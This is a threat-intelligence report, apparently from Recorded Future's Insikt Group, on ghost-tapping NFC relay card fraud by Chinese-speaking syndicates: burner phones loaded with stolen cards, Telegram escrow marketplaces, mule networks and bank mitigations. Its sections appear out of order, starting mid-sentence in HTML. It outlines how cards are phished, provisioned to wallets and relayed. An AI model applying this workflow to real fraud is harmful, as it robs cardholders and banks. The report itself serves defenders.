mobile malware or through social engineering techniques, this security feature will not be able to prevent cybercriminals from linking compromised payment cards to contactless payment systems.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_1de7b115a5dc1b8697230feddaa9f979db2dfda18.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1090\" height=\"1172\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 14:</em></strong> <em>An example of automated attempts to add a compromised payment card belonging to DBS Bank to Apple Pay at intervals of four to eight minutes via SMS; this automation technique can likely be applied to any banking institution (Source: Recorded Future Proprietary Data)</em></div>\n          </div>\n        </div>\n        <h4>Engagement</h4>\n        <p>Insikt Group engaged with @webu8 to find out more about ghost-tapping. The threat actor claimed that their ghost-tapping technique can be applied in any country and that the scheme involves a type of proprietary software capable of relaying payment card data to other mobile devices, which they develop and update regularly. The threat actor mentioned they would lend the proprietary software to us for free if we purchased compromised payment card credentials from them, and a member of their team would guide us on how to use it.</p>\n        <p>From this engagement, we learned that this threat group not only sells burner phones loaded with compromised payment card details, as shown in <strong>Figure 13</strong>, but also sells compromised payment card details directly to other Chinese syndicates through the use of proprietary software capable of relaying payment card information in real time. This criminal group orchestrating ghost-tapping schemes is unwilling to hire mules to conduct retail fraud using ghost-tapping methods by themselves and does not bear any risk of getting caught by law enforcement agencies while conducting retail fraud.</p>\n        <p>Chinese-speaking syndicates that purchase compromised payment card information, or burner phones loaded with compromised card information from this ghost-tapping threat group, are responsible for sending ghost-tapping mules to commit retail fraud or contactless NFC ATM withdrawal in person, where mules bear the greatest risk of being arrested by law enforcement agencies.</p>\n        <p>Due to the threat actor’s request to meet in person to discuss more business details in Cambodia, we assess with high confidence that well-established Chinese-speaking syndicates operating in Southeast Asia have members physically located in Cambodia who could discuss terms and conditions further. We also interpret the request for a physical meetup as a method used by the threat actor to filter out less-prominent criminal gangs and as a desire to conduct business with more well-established syndicates on a much larger scale to maximize their profits.</p>\n        <p>According to <a href=\"https://www.cleafy.com/cleafy-labs/supercardx-exposing-chinese-speaker-maas-for-nfc-relay-fraud-operation\">Cleafy</a>, the “SuperCard X” MaaS offering was created by a Chinese-speaking threat actor and shares similarities with the proprietary software @webu8 mentioned. According to Cleafy, the “Reader” application contains an embedded file that stores multiple “Answer To Reset” (ATR) messages. These messages, typically used to initiate and negotiate communication parameters between a smart card and an NFC reader, are reused to facilitate card emulation. When the \"Reader\" captures and relays a victim’s card data, the corresponding ATR is transmitted via the command-and-control (C2) infrastructure to the \"Tapper\" device that is going to use this message to emulate a virtual card, effectively deceiving POS terminals or ATMs into recognizing it as a legitimate physical card. By leveraging ATRs, SuperCard X enables seamless, real-time relay attacks, allowing threat actors to bypass physical proximity constraints and carry out fraudulent transactions. Insikt Group is unable to confirm whether the SuperCard X platform application is the proprietary software used by @webu8 due to the existence of multiple ghost-tapping criminals advertising similar schemes on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee.</p>\n        <p>Cleafy also identified a SuperCard X campaign <a href=\"https://www.cleafy.com/cleafy-labs/supercardx-exposing-chinese-speaker-maas-for-nfc-relay-fraud-operation\">targeting</a> Italy and found evidence that suggests custom builds tailored for specific affiliates or regional operations. This research corroborates @webu8’s claim that their ghost-tapping attack vector could be conducted anywhere in the world and that such proprietary software could be loaned to non-Chinese-speaking syndicates.</p>\n        <p>Insikt Group also published a report titled “SuperCard X MaaS Expands Infrastructure, Likely Targeting High-Profile Organizations,” which builds upon Cleafy’s research on the SuperCard X campaign.</p>\n        <h3>@xingma888: Reseller and Mule Controller</h3>\n        <h4>Background</h4>\n        <p>On Xinbi Guarantee, we engaged with the threat actor “星马集团” (@xingma888; translates to “Singapore and Malaysian organization”), who is involved with laundering funds into physical goods and cashing out. Through our conversations, we identified that the threat actor is part of a Chinese-speaking ghost-tapping syndicate that operates in Singapore and Malaysia. This threat actor engagement sheds light on how Chinese-speaking syndicates operate and how platforms such as Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee facilitate ghost-tapping campaigns and other forms of cybercrime.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_15120c58058c1f667b615649323e08eaea056f63a.png?width=750&amp;format=png&amp;optimize=medium\" width=\"1516\" height=\"1122\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 15:</em></strong> <em>@xingma888 is a member of Xinbi Guarantee and is open to using Xinbi, Huione, or Tudou Guarantee’s escrow service to deal with other Chinese-speaking threat actors (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h4>Engagement</h4>\n        <p>During an engagement, we learned that @xingma888 is able to supply a “motorcade” (车队) — mules for ghost-tapping campaigns to make in-person purchases at retail stores in Singapore and Malaysia. Threat actors requiring such services will have to specify what kind of physical goods they wish to obtain, and @xingma888 will quote the deposit amount required to mobilise the mules for the ghost-tapping campaign. The deposit amount must be paid in USDT to an escrow system belonging to either Huione, Tudou, or Xinbi Guarantee. In a manner similar to placing an order, the buyer has to provide a physical address for mules working for @xingma888 to deliver the physical goods. @xingma888 stated that after successfully delivering the goods, the buyer should take a video of the unboxing process and verify the authenticity of the items, then proceed to ask the customer service officer belonging to an escrow system of the buyer’s choice to release the amount of USDT to @xingma888.</p>\n        <p>Taking into account details of multiple threat engagements with different cybercriminals involved in ghost-tapping campaigns, as well as open-source articles reporting about syndicates funding transportation costs and air tickets for mules, Insikt Group assesses with a high level of confidence that @xingma888 funds the following:</p>\n        <ul>\n          <li>Burner phones loaded with stolen payment card credentials</li>\n          <li>Transportation costs, such as airline tickets for mules</li>\n          <li>Accommodation for mules</li>\n          <li>USDT or cash to recruit and pay mules</li>\n          <li>A money mule to launder USDT into fiat currency</li>\n        </ul>\n        <p>Meanwhile, prospective buyers, which usually refers to Chinese syndicates, will be able to resell the physical goods bought via ghost-tapping campaigns for cash, successfully converting USDT into fiat currency through this cash-out method. In most cases, the prospective buyer will have to pay a greater amount of USDT to mule handlers such as @xingma888. We also assess that syndicates will likely need to recruit reseller mules to resell the physical goods for cash. Insikt Group has yet to factor in the cost of obtaining USDT in the first place, which is most likely obtained through illicit means involving cybercrime, illegal online gambling, and scams, where Southeast Asia is a hotbed for Chinese criminal gangs.</p>\n        <p><strong>Figure 16</strong> illustrates how a Telegram-based escrow system, such as Xinbi Guarantee, helps to facilitate and mediate transactions between Chinese-speaking syndicates and mule controllers, such as @xingma888, looking to work together, as well as an overview of the financial gains each party receives during the process.</p>\n        <div>\n          <div>\n            <div>\n              <img loading=\"lazy\" alt=\"\" src=\"https://www.recordedfuture.com/media_199b0053559ce4e96a9baa87c0801fedd3b09a7c1.png?width=750&amp;format=png&amp;optimize=medium\" width=\"960\" height=\"540\" />\n            </div>\n          </div>\n          <div>\n            <div><strong><em>Figure 16:</em></strong> <em>Overview of mutual gains when syndicates work with mule controllers such as @xingma888 to cash out illicitly obtained USDT for fiat currency through ghost-tapping campaigns based on our threat actor engagement (Source: Recorded Future)</em></div>\n          </div>\n        </div>\n        <h2>Mitigations</h2>\n        <p>For banks and payment providers:</p>\n        <ul>\n          <li>Banks should introduce security measures to prevent payment card phishing fraud, such as a security feature that requires the individual to log in to their own bank account to authorize the linking of their payment card to a mobile wallet.

We assess that ghost-tapping criminals can capitalize on data breaches belonging to banks and telecommunications firms to obtain PII and use social engineering techniques to steal payment card information via phishing. Data breaches of telecommunications companies involving databases belonging to customers may increase the risk of SIM swapping, where cybercriminals can potentially add, link, and authenticate payment card information remotely to burner phones.<br /><br />Despite the shutdown of Huione Guarantee’s operations on May 13, 2025, we observed cybercriminals quickly pivoting toward alternative Telegram-based escrow systems such as Xinbi Guarantee and Tudou Guarantee. These platforms continue to empower cybercriminals to conduct transactions and recruit mules for ghost-tapping operations. Due to these marketplaces being criminal sources and claiming to be a trusted platform, there remains the possibility of them ceasing operations, like Huione Guarantee, while events such as Telegram clamping down on channels linked to these two platforms can temporarily disrupt ghost-tapping campaigns. If these two marketplaces were to cease operations, Chinese-speaking syndicates would likely pivot to different platforms that have stronger operation security measures, which could result in less visibility for researchers and law enforcement agencies to monitor ghost-tapping-related intelligence.</p>\n        <p>Success in ghost-tapping campaigns will bring about more financial resources to both syndicates and cybercriminals. Ghost-tapping is likely going to <a href=\"https://www.cleafy.com/cleafy-labs/supercardx-exposing-chinese-speaker-maas-for-nfc-relay-fraud-operation\">expand</a> globally, with threat actors offering custom-built tooling to tailor to non-Chinese speaking syndicates and regional operations.

This technique allows these threat actors to provide mules with stolen payment card details linked to contactless payment systems in person to obtain physical goods, eventually transporting and reselling stolen goods for profit. Insikt Group analysts identified a key threat actor on Telegram, @webu8, advertising burner phones and ghost-tapping services to Chinese-speaking threat groups (hereafter referred to as syndicates) and engaged with threat actors involved in retail fraud campaigns. Even though Huione Guarantee, a Telegram-based criminal marketplace, announced it shut down its operations on May 13, 2025, we observed cybercriminals and syndicates have since been using Huione Guarantee’s existing massive decentralized infrastructure on Telegram to conduct dealings. Chinese-speaking cybercriminals have also pivoted to Xinbi Guarantee and Tudou Guarantee platforms as one-stop shops to recruit ghost-tapping, transportation, reseller, and money laundering mules. We believe that established, Southeast Asia-based criminal groups that have been involved in scamming activities (romance, investment scam, and cryptomining, among others) since 2020 have begun and will continue to incorporate ghost-tapping campaigns into their activities for financial gains.\nThis report includes the key findings of our engagement with threat actors, analysis of video demonstrations showcasing ghost-tapping and contactless ATM withdrawals, open-source research, and law enforcement advisories to explain the Chinese ghost-tapping ecosystem. Insikt Group assesses that ghost-tapping campaigns are difficult to detect due to a lack of Know-Your-Customer (KYC) measures at retail stores and because syndicates can send mules claiming to be tourists to purchase physical goods and resell them for profit. These campaigns can negatively impact retail, banking, contactless payment providers, and insurance companies as a result of unauthorized payment card transactions belonging to payment cardholders. Although ghost-tapping campaigns have been widely reported in Singapore due to high-profile arrests, these campaigns can be conducted on a global scale.\nKey Findings\nChinese-speaking cybercriminals are using automation to add stolen payment card information to contactless payment wallets, selling burner phones, and providing an unspecified peripheral software capable of relaying payment card details to separate mobile devices to multiple Chinese-speaking criminal syndicates. Syndicates can also send burner phones back to these cybercriminals to recycle them for future retail fraud campaigns.\nThreat actors involved in ghost-tapping activities claim the technique can work worldwide, with some groups likely based in Cambodia and China. Through our engagements, we identified some threat actors that only operate domestically within China and other specific geographical locations such as Singapore, Malaysia, Thailand, and the Philippines.\nMany criminal groups are using ghost-tapping techniques to conduct ATM withdrawals and purchase luxury goods such as jewelry and mobile phones at retail stores. Once these goods have been purchased, threat actors resell them for cash on Telegram channels like Tudou Guarantee, Xinbi Guarantee, and Huione Guarantee.\nDue to the large number of advertisements regarding ghost-tapping campaigns and recruitment of mules to purchase physical goods using ghost-tapping techniques on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantees, we believe a large number of physical goods being sold on these Chinese cybercrime marketplaces are obtained through ghost-tapping techniques.\nBackground\n“Ghost Tap” is a term coined by Threat Fabric. It describes a tactic that threat actors use to cash out money after they have stolen credit card details linked to mobile payment services (such as Google Pay or Apple Pay). It also involves relaying NFC traffic, where cybercriminals phish or procure stolen payment cards and load them onto mobile wallets, which are then used for fraudulent transactions. Insikt Group defines ghost-tapping as NFC relay fraud; ghost-tapping involves criminals using mobile devices to relay payment information from a victim's card or device to a payment terminal without the victim's knowledge. Once the payment card information is stolen and loaded into mobile wallets, criminals can transmit an NFC signal containing payment card information to a different phone and scale the operation, which can greatly boost mobile wallet-related fraud.\nRecorded Future’s Payment Fraud Intelligence team has published a report titled “Mobile Wallet, Phishing, and Scam Nexus Supports Globally Distributed Card Fraud.” The report’s findings show that NFC relay fraud is an emerging and effective attack method that allows cybercriminals to conduct unauthorized transactions using stolen payment card credentials. Threat actors leverage phishing campaigns and malware to compromise payment cards and intercept one-time passwords (OTPs), which are often essential for adding these cards to mobile wallets. By using open-source NFC relay tools, such as NFCGate, attackers can transmit or relay tokenized card data in real time to other mobile devices. This method allows threat groups based anywhere in the world to:\nCentrally manage phishing campaigns to compromise payment cards belonging to victims in foreign countries and fraudulently activate the cards on mobile wallets under their control\nRelay the NFC traffic of compromised payment cards provisioned on mobile wallets to money mules who conduct fraudulent, tap-to-pay card-present transactions in the victims’ countries\nGhost-tapping campaigns consist of cyber and physical elements that require cybercriminals and syndicates to collaborate for the scheme to succeed. These cybercriminals use phishing campaigns, mobile malware, and social engineering techniques to obtain payment card credentials and one-time passwords to link payment card credentials belonging to victims to contactless payment systems (such as Apple Pay and Google Pay) on burner phones. The cybercriminals will then proceed to sell the burner phones loaded with payment card information and develop proprietary software capable of relaying payment card data to Chinese-speaking syndicates for ghost-tapping campaigns. In essence, cybercriminals only fulfill the cyber spectrum of ghost-tapping campaigns.\nSyndicates are well-established criminal groups looking to launder their illegally acquired gains through ghost-tapping campaigns. In ghost-tapping campaigns, the role of syndicates is to work closely with cybercriminals, hire mules to purchase physical goods using burner phones loaded with payment card credentials, and eventually resell the physical goods for cash. Syndicates are responsible for hiring mules, establishing their own contacts, strengthening their networks and supply chains to launder money through ghost-tapping campaigns. Syndicates fulfill both the cyber and physical spectrum of ghost-tapping campaigns. In November 2024, The Straits Times reported that criminal syndicates from China have been setting up bases in countries such as the Philippines, Australia, and Singapore to launder their gains from illegal activities such as illegal online gambling and scam campaigns as early as 2016.\nFigure 1: Overview of ghost-tapping campaign involving mobile wallets; an additional proprietary software is required to relay NFC traffic containing payment card data to another mobile phone from the attacker’s C2 infrastructure (Source: Recorded Future)\nAccording to a Threat Fabric report on ghost-tapping, the prerequisites for the tactic to be executed include a mobile device with NFC with stolen payment card data linked to a mobile payment system (most often iOS or Android), two mobile devices with NFCGate installed, and a server configured to relay the traffic. NFCGate is an Android application meant to capture, analyze, or modify NFC traffic. It can be used as a research tool to reverse engineer protocols or assess the security of protocols against traffic modifications.\nFigure 2: Overview of the ghost-tapping technique (Source: Threat Fabric)\nAccording to the Singapore Police Force, between October 1 and December 2024, there were 656 reports of compromised payment cards involving mobile wallets, with losses amounting to at least $1.2 million SGD ($0.93 million USD). Of these cases, at least 502 reports involved compromised payment cards that were linked to Apple Pay. After successfully linking victims’ credit card information to Apple Wallets, mules working for scam syndicates could make in-person purchases using NFC mobile payment methods to buy physical goods in-store, such as high-value electronic items or luxury goods.\nIn November 2024, The Straits Times reported about an emerging trend of foreign nationals being sent to Singapore by syndicates to commit payment card fraud at retail outlets across the country. Singaporean authorities also warned retailers about syndicates who has supposedly stolen the payment card details of victims through a series of online phishing scams. Stolen payment card details were then loaded onto an unspecified mobile application, which could be controlled remotely and used for contactless payments that work with point-of-sale (POS) terminals. Foreigners are believed to be recruited by transnational syndicates in their home countries via social messaging platforms and instructed to enter Singapore to buy items such as expensive mobile phones, electronic accessories, luxury goods, jewelry, and gold bars. Investigations from the Singapore Police Force revealed that mules recruited by Chinese syndicates also obtained images of fake Japanese passports to be used as proof of identity during the process of in-person purchases at retail stores, and credit card details had been unlawfully obtained through phishing. This case is most likely an example of ghost-tapping, as it involves payment card details loaded onto an unspecified mobile application that can be controlled remotely and used for contactless payments that work with point-of-sale (POS) terminals. The mobile application is most likely used for relaying NFC traffic involving payment card information from another device in real time.\nWe observed criminals buying and selling stolen goods on criminal sources, such as the Telegram marketplaces Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee. There have been reports (1, 2) of similar cases using the same TTPs involving individuals belonging to different nationalities. While Chinese syndicates do not explicitly mention selling goods on e-commerce websites, criminals have been known to sell stolen goods on eBay (1), Carousell (1), and Mercari (1), among others. We assess with a high degree of confidence that Chinese syndicates are also selling goods bought with stolen payment card information on e-commerce platforms.\nFigure 3: Luxury goods purchased from various retail stores using ghost-tapping techniques (Source: The Straits Times, photo provided by the Singapore Police Force)\nA Singapore Police Force advisory dated February 17, 2025, stated that scammers, who are likely based overseas, obtained card credentials belonging to victims through e-commerce-related phishing websites, including social media advertisements. The advisory states that after obtaining a victim’s payment card credentials, a scammer would then add the card details to the Apple Wallet on their own device. An SMS one-time password (OTP) would be sent to the victim, who is then tricked into entering the OTP into the phishing website operated by the scammer, thereby giving the scammer access to the victim’s payment card. After successfully taking over the victim’s payment card, the scam syndicate would conspire with a money mule to make unauthorized transactions by connecting the mule’s mobile device to the scammer’s Apple Wallet. The money mule would then be able to make in-person purchases using the contactless payment method (NFC) to buy goods in-store. This police advisory is likely describing ghost-tapping, where there is a need to connect the mule’s mobile device to mobile wallets controlled and operated by syndicates remotely.\nIn April 2025, two Chinese nationals were arrested for smuggling fifteen iPhones into Singapore from China; the individual and an accomplice were instructed by an unspecified syndicate to throw the phones into a trash can outside a local shopping mall. Insikt Group assesses with high confidence that the two individuals are likely transportation mules recruited by a Chinese-speaking syndicate, and the iPhones likely contain stolen payment card credentials that were already linked to Apple Pay. Once retrieved, the syndicate would have used the phones to activate ghost-tapping mules already residing within Singapore, who would then use them to buy physical goods in person. This case is an example of mobile wallet fraud, which involves burner phones loaded with stolen payment card information and does not require the use of NFC relay tactics.\nGhost-Tapping and the Criminal Ecosystem\nSince 2024, Insikt Group has observed Chinese cybercriminals operating on Telegram-based escrow platforms, such as Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee, to advertise criminal services and TTPs from general scamming to cryptomining. Through engagements with threat actors involved in different aspects of criminality, we learned that Chinese-speaking criminals involved in scamming-related activities are now adopting ghost-tapping into their attack vectors. We identified that ghost-tapping threat actors are based in Southeast Asian nations, specifically in Cambodia, and have been selling burner phones loaded with payment card credentials belonging to victims to multiple Chinese-speaking syndicates. A single ghost-tapping criminal group possesses the means and ability to provide essential items such as burner phones and loan proprietary software to multiple Chinese-speaking syndicates. This means that the existence of multiple ghost-tapping criminal groups would be able to facilitate a very large number of Chinese-speaking syndicates for many different ghost-tapping campaigns that target multiple businesses — specifically in the retail sector — globally.\nIn addition to advertising ghost-tapping services, we observed Chinese-speaking syndicates recruiting mules to conduct purchases on the three above-mentioned Telegram marketplaces. The syndicates will usually hire Chinese-speaking mules to conduct operations on their behalf, with mules traveling to foreign countries, such as Singapore, under the guise of tourists to purchase high-value physical goods such as gold, luxury items, and mobile phones. Chinese criminal syndicates will then resell the items on three Telegram marketplaces for cash.\nFigure 4: Overview of the ghost-tapping ecosystem showing how cybercriminals can facilitate ghost-tapping campaigns for multiple Chinese-speaking syndicates (Source: Recorded Future)\nDefinition of Different Types of Threat Actors and Mules in the Ghost-Tapping Ecosystem\nThrough observations, threat actor engagements, and open-source intelligence (OSINT) reporting, Insikt Group defines different types of threat actors and their roles within ghost-tapping campaigns as follows:\nCybercriminal: Obtains stolen payment card credentials and links them to contactless payment services such as Apple Pay and Google Pay. Cybercriminals develop software capable of relaying NFC traffic, including payment card data, in real time to other mobile devices, and they typically sell payment card information to syndicates looking to commit retail fraud via ghost-tapping campaigns. Additionally, cybercriminals sell burner phones loaded with stolen payment card credentials to syndicates to commit retail fraud.\nSyndicate: In charge of recruiting, training, and instructing different mules for specific purposes to ensure operational success. Chinese-speaking syndicate members typically use Telegram to recruit mules on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee platforms.\nGhost-Tapping Mule: Conducts retail fraud using ghost-tapping techniques to obtain physical goods, including gold, luxury items, and mobile phones. Mules often enter other countries as tourists, purchase high-value items, and deliver the items to a transportation mule or the syndicate directly.\nTransportation Mule: Transports goods within and beyond borders to the desired destination of the syndicate that hired them.\nReseller Mule: Sells items bought using stolen payment card credentials for Tether (USDT) on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee. We assess that such goods could also be transported and sold in different geographical regions for cash.\nMoney-Laundering Mule: Transfers money back to bank accounts of syndicate members. The syndicates have been known to use Telegram as a platform to recruit money mules.\nBuyer: Chinese-speaking syndicate offering to buy physical goods such as gold, luxury items, and mobile phones in large quantities with cash on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee platforms.\nWe assess that cybercriminals may undertake multiple roles and work for multiple syndicates simultaneously due to threat actors constantly advertising for the need of 车队 (motorcade), which indicates there is a high demand for different types of mules to fulfill the objectives of syndicates, such as conducting contactless ATM withdrawals, purchasing physical goods using ghost-tapping techniques, transporting, reselling physical goods, and money-laundering operations.\nOn Xinbi Guarantee, we observed threat actors offering transportation services for physical goods that can be transported within and across borders for specific countries. For example, the threat actor “路飞” (@OPLuffy888) advertised express transportation services for physical goods on Xinbi Guarantee to transport goods within and beyond Malaysia, Singapore, Indonesia, and Thailand. We also observed “黑猫” (@llan19889) recruiting ATM withdrawal mules and ghost-tapping mules to purchase gold and Apple mobile devices.\nFigure 5: Threat actor 黑猫 (@llan19889) recruiting ATM withdrawal mules and ghost-tapping mules to purchase gold and Apple mobile devices (Source: Telegram)\nFigure 6: Threat actor 路飞 (@OPLuffy888) advertising express transportation services for physical goods on Xinbi Guarantee to transport goods within and beyond Malaysia, Singapore, Indonesia, and Thailand (Source: Telegram)\nHuione Guarantee, Xinbi Guarantee, and Tudou Guarantee Facilitating Ghost-Tapping Campaigns\nHuione Guarantee (@hwdb) is a Chinese-language clearnet website that operates under the Huione Group, a financial conglomerate based in Cambodia. Huione Guarantee serves as a platform for thousands of public and private Chinese-language Telegram groups that provide various services that enable cybercriminal activities, providing escrow services to Chinese-speaking cybercriminals. Elliptic reported that illicit cryptocurrency-based activities linked to Huione Group reached at least $24 billion. Threat actors advertised the sale of social media and e-commerce accounts, SIM cards, data containing personally identifiable information (PII), malware-as-a-service (MaaS), deepfake technology, KYC bypass services, money-laundering methods and services, and more. For more information about Huione Guarantee, please refer to the Insikt Group report “Huione Guarantee Serves as a One-Stop Shop for Chinese-Speaking Cybercriminals.”\nDespite Huione Guarantee announcing the shutdown of their operations on May 13, 2025, we observed cybercriminals continuing to use Huione Guarantee’s vast infrastructure on Telegram to facilitate criminal activities and dealings. In addition, we observed cybercriminals pivoting to Xinbi Guarantee (@xbdb) and Tudou Guarantee (@tddb), two other Telegram-based marketplaces that function the same way as Huione Guarantee and serve as viable alternatives for Chinese-speaking cybercriminals to continue recruiting members for their cyber, fraud, and scamming campaigns. All deposits have to be made in USDT to a cryptocurrency wallet operated by Xinbi Guarantee and Tudou Guarantee’s customer service representatives.\nFigure 7: Xinbi Guarantee and Tudou Guarantee are platforms that provide escrow services similar to Huione Guarantee to facilitate the hiring of ghost-tapping, transportation, reseller, and money-laundering mules (Source: Recorded Future)\nWe observed Chinese-speaking cybercriminals advertising first-hand (一道) and second-hand (二道) payment cards on all three Telegram marketplaces for ghost-tapping campaigns. 远程刷卡 refers to remote card swiping, and in this case, it refers to ghost-tapping operations. Cybercriminals typically use USDT to purchase these payment card details belonging to victims, and the cards are advertised to work globally, including with NFC and POS terminals.\nIn Figure 8, the administrator of Xinbi Guarantee was observed advertising multiple channels involved in ghost-tapping operations on the now-defunct Xinbi Guarantee’s public community channel (新币公群频道; @gqdh). The administrator advertised more than ten different channels involved in ghost-tapping campaigns that include first- and second-hand payment cards, which indicates that multiple cybercriminal groups and Chinese-speaking syndicates are actively participating in such campaigns.\nFigure 8: An administrator of Xinbi Guarantee posting an advertisement about using first- and second-hand victim payment card credentials for ghost-tapping campaigns worldwide; the Telegram channel @gqdh, which used to be Xinbi Guarantee’s public community Telegram channel, has been deleted by Telegram, likely due to a violation of use terms (Source: Telegram)\nReselling of Goods to Launder Funds\nOn Huione Guarantee, Xinbi Guarantee, and Tudou Guarantee platforms, we observed threat actors offering to purchase and sell physical items obtained through illicit means in large quantities. Chinese-speaking syndicates typically do not specify how and where they obtained such physical items, but through our research, we believe there are two common methods: ghost-tapping campaigns and e-commerce fraud. The e-commerce method is considered more risky due to more digital and physical footprints, as key details such as online card payment details, physical addresses, and phone numbers are required. In comparison, ghost-tapping campaigns are much harder to detect by law enforcement agencies, and mules can travel to foreign countries and purchase physical goods on behalf of syndicates. These in-person transactions performed by mules grant syndicates the advantage of obtaining goods immediately and with greater control, often issuing specific instructions in real time to mules to deliver the goods to specific locations that could remain unknown to authorities for prolonged periods of time.\nDue to the large number of advertisements regarding ghost-tapping campaigns and recruitment of mules to purchase physical goods using ghost-tapping techniques, all being discussed and advertised together on Huione Guarantee, Xinbi Guarantee, and Tudou Guarantees, coupled with OSINT articles and a Singapore Police Force advisory (1, 2, 3) detailing ghost-tapping crimes, we believe with a high degree of confidence that a large number of physical goods being sold on these Chinese cybercrime marketplaces are obtained through ghost-tapping techniques.\nBased on advertisements on the three above-mentioned Telegram channels, Figure 9 illustrates how physical goods get transported and resold for cash as part of money-laundering operations by Chinese-speaking syndicates. It is highly likely that Chinese-speaking syndicates involved in ghost-tapping campaigns will resell physical items bought with stolen payment card credentials for cash.\nFigure 9: How physical goods get transported and resold for USDT/cash as part of money laundering operations by Chinese-speaking syndicates (Source: Recorded Future)\nFor example, we observed the threat actor “莫淮” (@eyDLBhqqotRXfJ) buying gold, mobile phones, and other physical goods that syndicates can offload in large quantities on Xinbi Guarantee.\nFigure 10: Threat actor 莫淮 (@eyDLBhqqotRXfJ) offering to buy gold, mobile phones, and other physical goods that can be offloaded by syndicates in large quantities on Xinbi Guarantee (Source: Telegram)\nThreat Analysis and Engagements\nInsikt Group conducted engagements with two Telegram monikers involved in different aspects of the ghost-tapping ecosystem: @webu8 (developer of proprietary software used in ghost-tapping) and @xingma888 (controller and recruiter of mules who purchase and resell luxury goods purchased through ghost-tapping). These engagements gave us valuable insights into the organization, structure, security measures, and TTPs used by these threat actors and their associates.\n@webu8: Ghost-Tapping Software Developer\nBackground\nInsikt Group discovered a public Chinese-language Telegram channel, cvv教学顶端学习禁广告 (@daoshua00), which has 5,695 members as of writing. This channel promotes ghost-tapping and carding-related services, as well as materials used in ghost-tapping campaigns, specifically first-hand phishing materials, penetration techniques, CVV tutorials, ATM card cloning, and exfiltration of databases. The administrators of this channel operate the Telegram handles @webu8 and @xbdb0. We note that @xbdb0 is similar to Xinbi Guarantee’s Telegram channel (@xbdb), and through our engagement with @xbdb0, the threat actor claimed they have connections with Xinbi Guarantee. We observed the administrators posting photos and video demonstrations of ghost-tapping for syndicates interested in conducting ghost-tapping campaigns. The videos and photos mainly consisted of cash, multiple burner mobile phones with compromised payment cards linked to Apple Pay and Google Pay services, cloned payment cards, and POS terminals. Individuals were asked to contact @webu8 for more information. We engaged with @webu8 and managed to get information and the description of the software being used for ghost-tapping purposes.\nFigures 11 and 12: (Left) Administrators of @daoshua are @webu8 and @xbdb0 (Source: Telegram); (Right) Xinbi Guarantee’s Telegram channel’s sharelink is @xbdb, which is very similar to the administrator of @daoshua00, whose moniker is @xbdb0; through engagement, @xbdb0 claimed to have connections with Xinbi Guarantee (Source: Telegram)\nThe three images below, shown in Figure 13, showcase @webu8’s advertisements on the Telegram channel @daoshua00.\nThe first image on the left shows multiple burner phones tagged with linked payment card credentials. Each phone is tagged with a card binding time (day and month the payment card was linked to the burner phone) and the quantity of compromised payment cards linked. The price of each phone is 90 USDT (approximately $90), and each linked card is 41 USDT (approximately $41); a minimum purchase of five burner mobile phones is required. If a burner phone contains ten linked compromised payment cards, the price of the phone is $500 USDT. The burner phone can be purchased in Putian City, Fujian Province, China. The threat actor used the Chinese text 莆田可面基 打速卖通的不要找我！禁止打国内!, which translates to: “Able to meet in Putian, please do not contact me if you use AliExpress! Domestic calls are prohibited!” Insikt Group assessed that such measures are to maintain anonymity and avoid detection by China’s law enforcement agencies, and having in-person meetups would be more secure to build a strong and stable relationship among Chinese cybercriminals. @webu8 also provided a phone recycling service for Chinese-speaking syndicates, likely to load new compromised payment card credentials into existing burner phones. We note that in August 2023, law enforcement agencies in Singapore arrested ten Chinese-speaking syndicate members originating from Fujian, China, and seized assets worth $3 billion Singapore dollars ($2.33 billion USD). The members are linked to unlicensed money lending in China, scams, and remote online gambling operations in the Philippines. Insikt Group is unable to confirm whether @webu8 and @xbdb0 are linked to the same syndicate whose members were arrested in 2023.\nThe second image in the middle showcases @webu8 advertising stolen card credentials linked to an unspecified contactless payment system, with payment card values indicating available remaining credit. The threat actor claims these cards are compatible with Apple Pay and Google Pay, have ready stocks for sale, and can be used for ghost-tapping purposes.\nThe third image on the right showcases @djdj8884, another ghost-tapping seller, advertising US payment cards with PIN codes obtained from phishing campaigns. The threat actor is seeking to supply newly phished payment cards regularly to Chinese-speaking syndicates. The cards are advertised to be compatible with making payments to purchase physical goods over POS machines. The screenshot shows burner phones loaded with multiple cards, indicating that the buyer can load the payment card information, together with PIN codes, into their own burner phones.\nFigure 13: @webu8 advertising burner iPhones loaded with stolen payment card credentials; each mobile phone is tagged with a serial number, and all phones are either set to airplane mode or have no SIM cards inside (Source: Telegram)\nFrom these three images, we observed two business models used by ghost-tapping criminals:\n@webu8 threat group’s business model is to load compromised payment card credentials onto burner phones, getting syndicate members to deal in person with the buyer located in “Putian”, a city in Fujian Province, China. For this business model, the buyer is getting burner phones that are already loaded successfully and ready for ghost-tapping campaigns.\n@djdj8884 threat group’s business model sells compromised payment card credentials in bulk, together with PIN codes to other Chinese-speaking syndicate members, where transactions can be conducted remotely. For this business model, the buyer is responsible for loading compromised payment card credentials into their own burner phones to prepare for future ghost-tapping campaigns. Insikt Group assessed that this business model requires more preparation time, as not all compromised cards can be loaded into a contactless payment system due to varying security measures employed by different banks.\nWe also obtained evidence through proprietary means that cybercriminals are automating the process of linking compromised card credentials to contactless payment systems on burner phones. The screenshot below shows automated attempts to add a compromised payment card belonging to DBS Bank to Apple Pay at intervals of every four to eight minutes. In this case, DBS Bank employs a security feature that requires an individual to log in to their mobile application to authorize the authentication of linking their payment cards to a mobile wallet such as Apple Pay or Google Pay. Customers who wish to add their DBS card must first turn on the “Mobile wallets” toggle in Payment Controls within the DBS digibank app. To further protect users, this “Mobile wallets” feature will be automatically turned off if the card is not added to any mobile wallet within ten minutes. However, in the event that an individual’s bank login details are compromised due to mobile malware or through social engineering techniques, this security feature will not be able to prevent cybercriminals from linking compromised payment cards to contactless payment 